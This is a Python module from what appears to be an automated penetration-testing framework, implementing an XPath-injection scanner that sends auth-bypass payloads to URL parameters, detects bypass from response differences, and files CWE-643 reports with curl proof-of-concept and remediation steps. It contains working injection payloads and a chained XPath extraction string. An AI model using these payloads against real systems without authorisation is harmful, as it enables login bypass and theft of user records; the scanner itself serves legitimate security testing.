"""`scan_xpath_injection` — deterministic XPath-injection specialist
(workitem.md Phase 2.7).

Closes CWE-643 (improper neutralization of data within XPath
expressions). XPath injection is the SQL-injection-of-XML — same
shape, different parser. Common in legacy SOAP / B2B integrations
that store user records in an XML file and authenticate via XPath.

Detection strategy
------------------

Baseline-vs-probe differential. For each candidate param, send a
baseline value, then iterate XPath operator-injection variants:

  1. **Auth-bypass classic** — `' or '1'='1`
  2. **Always-true close-tag** — `' or 1=1 or ''='`
  3. **Comment-style** — `'or count(/*)>0 or 'a'='`
  4. **Numeric variant** — `1 or 1=1`

Detection criterion: probe response is materially different from
baseline AND consistent with bypass — login succeeds, more records
returned, or boolean error message disappears.

Auto-emits CWE-643 finding on detection. Severity: high (auth bypass
+ data exfil class). Critical when bypass exposes admin/privileged
records.
"""

from __future__ import annotations

import logging
from typing import Any
from urllib.parse import urlparse

from strix.tools.specialist.registry import register_specialist_tool
from strix.tools.specialist.result import (
    FindingDraft,
    SpecialistResult,
)


logger = logging.getLogger(__name__)


# (label, payload, description, severity)
_PROBES: tuple[tuple[str, str, str, str], ...] = (
    (
        "xpath_or_true_quoted",
        "' or '1'='1",
        "Classic XPath auth-bypass — close quote, OR true, leave dangling quote for parser",
        "high",
    ),
    (
        "xpath_or_true_close",
        "' or 1=1 or ''='",
        "XPath always-true with proper close",
        "high",
    ),
    (
        "xpath_count_star",
        "'or count(/*)>0 or 'a'='",
        "Function-call probe: count(/*) returns >0 for any non-empty XML",
        "high",
    ),
    (
        "xpath_numeric_or",
        "1 or 1=1",
        "Numeric-context XPath bypass",
        "high",
    ),
)


def _swap_param(url: str, param: str, value: str) -> str:
    """Replace `param=...` in the URL's query string."""
    from urllib.parse import parse_qs, urlencode, urlunparse

    parts = urlparse(url)
    qs = parse_qs(parts.query, keep_blank_values=True)
    flat = {k: (v[0] if v else "") for k, v in qs.items()}
    flat[param] = value
    return urlunparse(parts._replace(query=urlencode(flat, doseq=False)))


def _is_evidence_of_injection(
    *, baseline_status: int, baseline_body: str,
    probe_status: int, probe_body: str,
) -> tuple[bool, str]:
    """Decide whether the probe response evidences XPath injection."""
    if probe_status >= 500:
        # 500 + XPath-flavoured error string suggests parser broke
        # → strong signal of injection (we changed the query shape).
        if any(
            marker in (probe_body or "").lower()
            for marker in (
                "xpath", "xpathexception", "xpath syntax",
                "system.xml.xpath", "javax.xml.xpath",
            )
        ):
            return True, "XPath parser exception leaked in response"
        return False, f"probe status {probe_status} (no XPath markers)"

    bb = (baseline_body or "")
    pb = (probe_body or "")

    # Heuristic 1: baseline empty/auth-failed, probe populated
    baseline_failure = (
        baseline_status in (401, 403, 404)
        or "invalid" in bb.lower() or "not found" in bb.lower()
        or bb.strip() in {"[]", "{}", "null", ""}
    )
    probe_success = (
        probe_status == 200 and len(pb) > max(50, len(bb) + 100)
    )
    if baseline_failure and probe_success:
        return True, "baseline failed → probe returned data (auth/query bypass)"

    # Heuristic 2: probe contains success markers absent from baseline
    success_markers = ("\"token\":", "\"jwt\":", "\"success\": true",
                       "\"authenticated\": true", "welcome", "logged in")
    new_markers = [m for m in success_markers
                   if m in pb.lower() and m not in bb.lower()]
    if new_markers:
        return True, f"probe includes success markers absent from baseline: {new_markers}"

    # Heuristic 3: significant length expansion at 200.
    if probe_status == 200 and len(bb) > 0 and len(pb) > len(bb) * 2 + 100:
        return True, f"response grew {len(bb)}B → {len(pb)}B"

    return False, "responses similar"


def _emit_finding(
    *,
    url: str,
    param: str,
    probe_label: str,
    payload: str,
    evidence_reason: str,
    response_excerpt: str,
    severity: str,
) -> str | None:
    try:
        from strix.telemetry.tracer import get_global_tracer

        tracer = get_global_tracer()
        if tracer is None:
            return None
        finding_id = tracer.add_vulnerability_report(
            title=f"XPath injection in `{param}` parameter",
            severity=severity,
            cwe="CWE-643",
            endpoint=url,
            target=url,
            category="xpath_injection",
            verification_status="verified",
            confidence=0.93,
            description=(
                f"The `{param}` parameter at `{url}` is concatenated into "
                f"an XPath expression on the server. Probe `{probe_label}` "
                f"with payload `{payload}` returned a response that "
                f"materially differs from the baseline.\n  Evidence: "
                f"{evidence_reason}"
            ),
            impact=(
                "XPath injection. Attacker rewrites the XPath query "
                "the server uses to retrieve XML data:\n"
                "  * Auth bypass — login as any user without "
                "    knowing their password.\n"
                "  * Data exfiltration — pull records the attacker "
                "    isn't authorized to read.\n"
                "  * Boolean blind — leak record contents char-by-char "
                "    via response-time / response-shape differences.\n"
                "  * On legacy XML-RPC / SOAP endpoints, frequently "
                "    enables full enumeration of user databases."
            ),
            technical_analysis=(
                f"Endpoint: {url}\n"
                f"Param: {param}\n"
                f"Probe: {probe_label}\n"
                f"Payload: {payload}\n"
                f"Evidence: {evidence_reason}\n"
                f"Response excerpt:\n{response_excerpt[:1500]}"
            ),
            poc_description=(
                f"1. Send GET request to {url} with `{param}` set to "
                f"`{payload}`.\n"
                f"2. Compare to baseline response — bypass succeeds "
                f"when response is materially different.\n"
                f"3. Pivot to data exfil with chained XPath: "
                f"`'] | //user/* | //password[@name='`."
            ),
            poc_script_code=(
                f"curl -sS -G '{url}' --data-urlencode '{param}={payload}'"
            ),
            remediation_steps=(
                "1. Use parameterized XPath (XPath variables) instead "
                "of string concatenation:\n"
                "     # Java: XPath.compile(\"//user[username=$u and "
                "       password=$p]\")\n"
                "          .setVariable(qname('u'), userInput)\n"
                "2. If parameterized API is unavailable, escape "
                "single + double quotes server-side BEFORE building "
                "the expression:\n"
                "     escaped = input.replace(\"'\", \"&apos;\")."
                "replace('\"', '&quot;')\n"
                "3. Migrate from XML-document-based auth to a proper "
                "database with parameterized queries."
            ),
            cvss_breakdown={
                "AV": "N", "AC": "L", "PR": "N", "UI": "N",
                "S": "U", "C": "H", "I": "H", "A": "N",
            },
            reasoning_trace=[
                f"Probed {param}= with XPath payload `{probe_label}`.",
                f"Payload: {payload}",
                f"Evidence: {evidence_reason}",
                "Server concatenates input into an XPath expression.",
            ],
        )
        try:
            from strix.agents.kg_emit import record_finding_in_kg
            record_finding_in_kg(
                finding_id=finding_id, url=url, param=param,
                cwe="CWE-643", severity=severity, category="xpath_injection",
                method="GET", detection_kind=probe_label[:60], confidence=0.9,
            )
        except Exception as e:  # noqa: BLE001
            logger.debug("scan_xpath_injection: kg record failed: %s", e, exc_info=True)
        return finding_id
    except Exception as e:  # noqa: BLE001
        logger.debug("scan_xpath_injection: emit failed: %s", e, exc_info=True)
        return None


@register_specialist_tool(
    category="xpath-injection-specialist",
    llm=False,
    default_budget={"cost_usd": 0.0, "max_wall_seconds": 60},
    sandbox_execution=False,
    provenance="framework",
    mitre_techniques=["T1190"],
)
def scan_xpath_injection(
    *,
    url: str,
    params: list[str] | str | None = None,
    param: str | None = None,
    other_params: dict[str, str] | None = None,
    extra_headers: dict[str, str] | None = None,
) -> SpecialistResult:
    """Deterministic XPath-injection scanner."""
    if not isinstance(url, str) or not url.strip():
        return SpecialistResult(status="error", error="url required")
    url = url.strip()

    if param and not params:
        params = [param]
    if isinstance(params, str):
        params = [params]

    parsed = urlparse(url)
    if not params:
        from urllib.parse import parse_qs
        qs_keys = list(parse_qs(parsed.query).keys())
        # XPath-prone shapes: auth + identifier params on legacy
        # XML/SOAP endpoints.
        xpath_lexicon = {
            "username", "user", "uid", "userid", "id", "email",
            "password", "passwd", "pwd", "token", "name",
            "role", "group", "department",
            "q", "query", "search", "filter", "category",
        }
        params = [k for k in qs_keys if k.lower() in xpath_lexicon]
        if not params:
            params = qs_keys
    if not params:
        return SpecialistResult(
            status="partial",
            error="no XPath-shaped params found",
        )

    extra_headers = dict(extra_headers or {})
    if "Authorization" not in extra_headers and "authorization" not in {
        h.lower() for h in extra_headers
    }:
        try:
            from strix.agents.security_context import list_auth_states
            for state in list_auth_states():
                if state.bearer:
                    extra_headers["Authorization"] = f"Bearer {state.bearer}"
                    break
                if state.cookies:
                    extra_headers["Cookie"] = "; ".join(
                        f"{k}={v}" for k, v in state.cookies.items()
                    )
                    break
        except Exception:  # noqa: BLE001
            pass

    try:
        from strix.tools.proxy.proxy_manager import get_proxy_manager
        pm = get_proxy_manager()
    except Exception as e:  # noqa: BLE001
        return SpecialistResult(
            status="error",
            error=f"proxy_manager unavailable: {type(e).__name__}: {e}",
        )

    drafts: list[FindingDraft] = []
    evidence: list[str] = []
    emitted_count = 0
    probe_count = 0
    seen_endpoint_param: set[tuple[str, str]] = set()

    for raw_param in params:
        if not isinstance(raw_param, str) or not raw_param.strip():
            continue
        p = raw_param.strip()
        key = (parsed.path or "/", p)
        if key in seen_endpoint_param:
            continue

        # Baseline.
        try:
            base_resp = pm.send_simple_request(
                "GET", _swap_param(url, p, "__strix_baseline__"),
                headers=extra_headers, body="", timeout=15,
            )
            probe_count += 1
        except Exception as e:  # noqa: BLE001
            evidence.append(f"baseline transport error for {p}: {e}")
            continue
        if "error" in base_resp and not base_resp.get("status_code"):
            continue
        baseline_body = base_resp.get("body") or ""
        baseline_status = int(base_resp.get("status_code") or 0)

        for label, payload, _description, severity in _PROBES:
            probe_url = _swap_param(url, p, payload)
            try:
                resp = pm.send_simple_request(
                    "GET", probe_url,
                    headers=extra_headers, body="", timeout=15,
                )
                probe_count += 1
            except Exception as e:  # noqa: BLE001
                evidence.append(f"transport error ({label}): {e}")
                continue
            if "error" in resp and not resp.get("status_code"):
                continue
            probe_body = resp.get("body") or ""
            probe_status = int(resp.get("status_code") or 0)
            ok, reason = _is_evidence_of_injection(
                baseline_status=baseline_status, baseline_body=baseline_body,
                probe_status=probe_status, probe_body=probe_body,
            )
            if not ok:
                continue
            seen_endpoint_param.add(key)
            excerpt = probe_body[:1200]
            rid = _emit_finding(
                url=url, param=p,
                probe_label=label, payload=payload,
                evidence_reason=reason,
                response_excerpt=excerpt,
                severity=severity,
            )
            if rid:
                emitted_count += 1
            drafts.append(FindingDraft(
                title=f"XPath injection in `{p}` ({label})",
                severity=severity, cwe="CWE-643",
                endpoint=url, category="xpath_injection",
                verification_status="verified", confidence=0.93,
                description=f"XPath: {label} → {reason}",
            ))
            evidence.append(f"XPath injection: {p} via {label}; {reason}")
            break

    try:
        from strix.agents.security_context import record_endpoint
        record_endpoint(url, method="GET", params=params, probed_for="xpath_injection")
    except Exception:  # noqa: BLE001
        pass
    try:
        from strix.agents.decision_log import record_decision
        record_decision(
            kind="specialist_invocation", target=url,
            actor={"tool_name": "scan_xpath_injection"},
            input={"params": list(params), "probes_sent": probe_count},
            output={"findings_emitted": emitted_count, "drafts": len(drafts)},
        )
    except Exception:  # noqa: BLE001
        pass

    return SpecialistResult(
        status="ok",
        findings=drafts,
        evidence=evidence[:50],
        next_probes_suggested=(
            ["confirm with XPath enumeration: `'] | //user/* | //u[@x='`"]
            if drafts else
            ["no XPath injection on listed params; consider POST/JSON "
             "auth endpoints + legacy SOAP/XML routes"]
        ),
        tool_metadata={
            "probes_sent": probe_count,
            "params_probed": len(params),
            "findings_emitted_to_tracer": emitted_count,
        },
    )
